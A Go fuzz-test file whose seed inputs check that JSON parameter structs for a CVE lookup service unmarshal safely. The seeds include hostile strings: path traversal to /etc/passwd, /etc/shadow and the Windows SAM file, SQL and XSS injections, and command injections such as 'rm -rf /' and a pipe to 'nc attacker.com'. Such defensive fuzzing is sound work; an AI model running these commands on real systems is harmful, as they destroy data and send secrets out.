package rpc

import (
	"encoding/json"
	"fmt"
	"testing"
)

// FuzzFetchCVEsParams tests JSON unmarshaling of FetchCVEsParams with random inputs
func FuzzFetchCVEsParams(f *testing.F) {
	// Add comprehensive seed corpus (50+ cases)
	// Valid cases
	f.Add([]byte(`{"start_index":0,"results_per_page":100}`))
	f.Add([]byte(`{"start_index":10,"results_per_page":50}`))
	f.Add([]byte(`{"start_index":100,"results_per_page":1}`))
	f.Add([]byte(`{"start_index":1000,"results_per_page":2000}`))
	
	// Edge cases - negative values
	f.Add([]byte(`{"start_index":-1,"results_per_page":100}`))
	f.Add([]byte(`{"start_index":0,"results_per_page":-1}`))
	f.Add([]byte(`{"start_index":-100,"results_per_page":-50}`))
	
	// Edge cases - zero values
	f.Add([]byte(`{"start_index":0,"results_per_page":0}`))
	
	// Edge cases - very large values
	f.Add([]byte(`{"start_index":2147483647,"results_per_page":2147483647}`))
	f.Add([]byte(`{"start_index":999999999,"results_per_page":1}`))
	
	// Malformed JSON
	f.Add([]byte(`{}`))
	f.Add([]byte(`{"start_index":}`))
	f.Add([]byte(`{"start_index":0}`))
	f.Add([]byte(`{"results_per_page":100}`))
	
	// Type mismatches
	f.Add([]byte(`{"start_index":"invalid","results_per_page":100}`))
	f.Add([]byte(`{"start_index":0,"results_per_page":"invalid"}`))
	f.Add([]byte(`{"start_index":null,"results_per_page":null}`))
	f.Add([]byte(`{"start_index":true,"results_per_page":false}`))
	f.Add([]byte(`{"start_index":[],"results_per_page":{}}`))
	
	// Extra fields
	f.Add([]byte(`{"start_index":0,"results_per_page":100,"extra":"field"}`))
	f.Add([]byte(`{"start_index":0,"results_per_page":100,"malicious":"<script>"}`))
	
	// Unicode and special characters
	f.Add([]byte(`{"start_index":0,"results_per_page":100,"extra":"日本語"}`))
	f.Add([]byte(`{"start_index":0,"results_per_page":100,"extra":"\\u0000"}`))
	
	// Generate programmatic test cases
	for i := 0; i < 20; i++ {
		f.Add([]byte(fmt.Sprintf(`{"start_index":%d,"results_per_page":%d}`, i*10, i+1)))
	}

	f.Fuzz(func(t *testing.T, data []byte) {
		var params FetchCVEsParams
		// Should not panic, but may return error
		_ = json.Unmarshal(data, &params)
	})
}

// FuzzImportParams tests JSON unmarshaling of ImportParams with random inputs
func FuzzImportParams(f *testing.F) {
	// Add comprehensive seed corpus (50+ cases)
	// Valid cases
	f.Add([]byte(`{"path":"/tmp/test.xml","xsd":"/tmp/schema.xsd","force":true}`))
	f.Add([]byte(`{"path":"./local.xml","xsd":"./schema.xsd","force":false}`))
	f.Add([]byte(`{"path":"/var/data/import.xml","force":true}`))
	f.Add([]byte(`{"path":"data.xml"}`))
	
	// Path traversal attempts
	f.Add([]byte(`{"path":"../../../etc/passwd"}`))
	f.Add([]byte(`{"path":"..\\..\\..\\windows\\system32\\config\\sam"}`))
	f.Add([]byte(`{"path":"/etc/shadow"}`))
	f.Add([]byte(`{"path":"C:\\Windows\\System32\\config\\SAM"}`))
	
	// Empty and null values
	f.Add([]byte(`{"path":"","xsd":"","force":false}`))
	f.Add([]byte(`{}`))
	f.Add([]byte(`{"path":null,"xsd":null,"force":null}`))
	
	// XSD variations
	f.Add([]byte(`{"path":"test.xml","xsd":""}`))
	f.Add([]byte(`{"path":"test.xml"}`))
	
	// Force flag variations
	f.Add([]byte(`{"path":"test.xml","force":true}`))
	f.Add([]byte(`{"path":"test.xml","force":false}`))
	f.Add([]byte(`{"path":"test.xml","force":"true"}`))
	f.Add([]byte(`{"path":"test.xml","force":1}`))
	
	// Special characters in paths
	f.Add([]byte(`{"path":"test file.xml"}`))
	f.Add([]byte(`{"path":"test\nfile.xml"}`))
	f.Add([]byte(`{"path":"test\u0000file.xml"}`))
	f.Add([]byte(`{"path":"日本語.xml"}`))
	
	// Injection attempts
	f.Add([]byte(`{"path":"'; DROP TABLE imports--"}`))
	f.Add([]byte(`{"path":"<script>alert('xss')</script>"}`))
	f.Add([]byte(`{"path":"test.xml; rm -rf /"}`))
	f.Add([]byte(`{"path":"test.xml && echo pwned"}`))
	
	// Very long paths
	longPath := make([]byte, 1000)
	for i := range longPath {
		longPath[i] = 'a'
	}
	f.Add([]byte(fmt.Sprintf(`{"path":"%s"}`, longPath)))
	
	// Type mismatches
	f.Add([]byte(`{"path":123}`))
	f.Add([]byte(`{"path":[]}`))
	f.Add([]byte(`{"path":{}}`))
	
	// Generate programmatic test cases
	for i := 0; i < 20; i++ {
		f.Add([]byte(fmt.Sprintf(`{"path":"file%d.xml","force":%v}`, i, i%2 == 0)))
	}

	f.Fuzz(func(t *testing.T, data []byte) {
		var params ImportParams
		// Should not panic, but may return error
		_ = json.Unmarshal(data, &params)
	})
}

// FuzzGetByIDParams tests JSON unmarshaling of GetByIDParams with random inputs
func FuzzGetByIDParams(f *testing.F) {
	// Add comprehensive seed corpus (50+ cases)
	// Valid CVE IDs
	f.Add([]byte(`{"id":"CVE-2021-44228"}`))
	f.Add([]byte(`{"id":"CVE-2023-12345"}`))
	f.Add([]byte(`{"id":"CVE-1999-0001"}`))
	
	// Empty and null
	f.Add([]byte(`{"id":""}`))
	f.Add([]byte(`{}`))
	f.Add([]byte(`{"id":null}`))
	
	// XSS attempts
	f.Add([]byte(`{"id":"<script>alert('xss')</script>"}`))
	f.Add([]byte(`{"id":"<img src=x onerror=alert(1)>"}`))
	f.Add([]byte(`{"id":"javascript:alert(1)"}`))
	
	// SQL injection attempts
	f.Add([]byte(`{"id":"'; DROP TABLE users--"}`))
	f.Add([]byte(`{"id":"' OR '1'='1"}`))
	f.Add([]byte(`{"id":"admin'--"}`))
	f.Add([]byte(`{"id":"1; DELETE FROM cves"}`))
	
	// Command injection attempts
	f.Add([]byte(`{"id":"test; rm -rf /"}`))
	f.Add([]byte(`{"id":"test && cat /etc/passwd"}`))
	f.Add([]byte(`{"id":"test | nc attacker.com 1234"}`))
	
	// Path traversal
	f.Add([]byte(`{"id":"../../etc/passwd"}`))
	f.Add([]byte(`{"id":"..\\..\\windows\\system32"}`))
	
	// Format string attacks
	f.Add([]byte(`{"id":"%s%s%s%s%s"}`))
	f.Add([]byte(`{"id":"%n%n%n%n"}`))
	
	// Unicode and special characters
	f.Add([]byte(`{"id":"日本語テスト"}`))
	f.Add([]byte(`{"id":"test\\u0000null"}`))
	f.Add([]byte(`{"id":"test\ntest\ttest"}`))
	
	// Very long IDs
	longID := make([]byte, 500)
	for i := range longID {
		longID[i] = 'A'
	}
	f.Add([]byte(fmt.Sprintf(`{"id":"%s"}`, longID)))
	
	// Type mismatches
	f.Add([]byte(`{"id":12345}`))
	f.Add([]byte(`{"id":true}`))
	f.Add([]byte(`{"id":[]}`))
	f.Add([]byte(`{"id":{}}`))
	
	// Generate programmatic test cases
	for i := 2000; i < 2030; i++ {
		f.Add([]byte(fmt.Sprintf(`{"id":"CVE-%d-12345"}`, i)))
	}

	f.Fuzz(func(t *testing.T, data []byte) {
		var params GetByIDParams
		// Should not panic, but may return error
		_ = json.Unmarshal(data, &params)
	})
}

// FuzzCVEIDParams tests JSON unmarshaling of CVEIDParams with random inputs
func FuzzCVEIDParams(f *testing.F) {
	// Add comprehensive seed corpus (50+ cases)
	// Valid CVE IDs
	f.Add([]byte(`{"cve_id":"CVE-2021-44228"}`))
	f.Add([]byte(`{"cve_id":"CVE-2023-00001"}`))
	f.Add([]byte(`{"cve_id":"CVE-2024-99999"}`))
	
	// Invalid formats
	f.Add([]byte(`{"cve_id":"NOT-A-CVE"}`))
	f.Add([]byte(`{"cve_id":"CVE-XXXX-YYYY"}`))
	f.Add([]byte(`{"cve_id":"cve-2021-12345"}`))
	f.Add([]byte(`{"cve_id":"CVE20211234"}`))
	
	// Empty and null
	f.Add([]byte(`{"cve_id":""}`))
	f.Add([]byte(`{}`))
	f.Add([]byte(`{"cve_id":null}`))
	
	// Type mismatches
	f.Add([]byte(`{"cve_id":12345}`))
	f.Add([]byte(`{"cve_id":2021.44228}`))
	f.Add([]byte(`{"cve_id":true}`))
	f.Add([]byte(`{"cve_id":[]}`))
	f.Add([]byte(`{"cve_id":{}}`))
	
	// Malicious payloads
	f.Add([]byte(`{"cve_id":"<script>alert(1)</script>"}`))
	f.Add([]byte(`{"cve_id":"'; DROP TABLE cves--"}`))
	f.Add([]byte(`{"cve_id":"$(rm -rf /)"}`))
	
	// Boundary cases
	f.Add([]byte(`{"cve_id":"CVE-0000-0000"}`))
	f.Add([]byte(`{"cve_id":"CVE-9999-99999"}`))
	
	// Generate programmatic test cases
	for year := 2020; year <= 2030; year++ {
		for id := 0; id < 5; id++ {
			f.Add([]byte(fmt.Sprintf(`{"cve_id":"CVE-%d-%05d"}`, year, id)))
		}
	}

	f.Fuzz(func(t *testing.T, data []byte) {
		var params CVEIDParams
		// Should not panic, but may return error
		_ = json.Unmarshal(data, &params)
	})
}

// FuzzListParams tests JSON unmarshaling of ListParams with random inputs
func FuzzListParams(f *testing.F) {
	// Add comprehensive seed corpus (50+ cases)
	// Valid cases
	f.Add([]byte(`{"offset":0,"limit":10}`))
	f.Add([]byte(`{"offset":10,"limit":20}`))
	f.Add([]byte(`{"offset":100,"limit":50}`))
	f.Add([]byte(`{"offset":0,"limit":1}`))
	f.Add([]byte(`{"offset":0,"limit":1000}`))
	
	// Negative values
	f.Add([]byte(`{"offset":-1,"limit":10}`))
	f.Add([]byte(`{"offset":0,"limit":-1}`))
	f.Add([]byte(`{"offset":-100,"limit":-50}`))
	f.Add([]byte(`{"offset":-2147483648,"limit":-2147483648}`))
	
	// Zero values
	f.Add([]byte(`{"offset":0,"limit":0}`))
	
	// Very large values
	f.Add([]byte(`{"offset":2147483647,"limit":2147483647}`))
	f.Add([]byte(`{"offset":999999999,"limit":999999999}`))
	
	// Empty and null
	f.Add([]byte(`{}`))
	f.Add([]byte(`{"offset":null,"limit":null}`))
	
	// Type mismatches
	f.Add([]byte(`{"offset":"invalid","limit":"bad"}`))
	f.Add([]byte(`{"offset":"0","limit":"10"}`))
	f.Add([]byte(`{"offset":true,"limit":false}`))
	f.Add([]byte(`{"offset":10.5,"limit":20.7}`))
	f.Add([]byte(`{"offset":[],"limit":{}}`))
	
	// Partial data
	f.Add([]byte(`{"offset":10}`))
	f.Add([]byte(`{"limit":10}`))
	
	// Extra fields
	f.Add([]byte(`{"offset":0,"limit":10,"extra":"field"}`))
	f.Add([]byte(`{"offset":0,"limit":10,"malicious":"<script>"}`))
	
	// Generate programmatic test cases
	for i := 0; i < 20; i++ {
		f.Add([]byte(fmt.Sprintf(`{"offset":%d,"limit":%d}`, i*10, (i+1)*5)))
	}
	
	// Pagination edge cases
	for limit := 1; limit <= 100; limit *= 10 {
		for offset := 0; offset < 1000; offset += 100 {
			f.Add([]byte(fmt.Sprintf(`{"offset":%d,"limit":%d}`, offset, limit)))
		}
	}

	f.Fuzz(func(t *testing.T, data []byte) {
		var params ListParams
		// Should not panic, but may return error
		_ = json.Unmarshal(data, &params)
	})
}
